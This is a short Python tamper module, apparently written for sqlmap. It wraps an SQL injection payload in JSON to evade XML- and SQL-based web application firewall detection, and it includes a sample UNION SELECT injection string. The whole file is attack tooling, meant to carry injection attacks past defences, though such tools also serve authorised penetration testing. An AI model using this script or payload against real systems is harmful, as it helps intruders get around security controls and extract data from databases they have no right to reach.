import json

__example_payload__ = "' AND 1=1 UNION SELECT NULL--"
__type__ = "JSON encoding to bypass XML/SQL based WAF detection"


def tamper(payload, **kwargs):
    retval = json.dumps({"q": payload})
    return retval
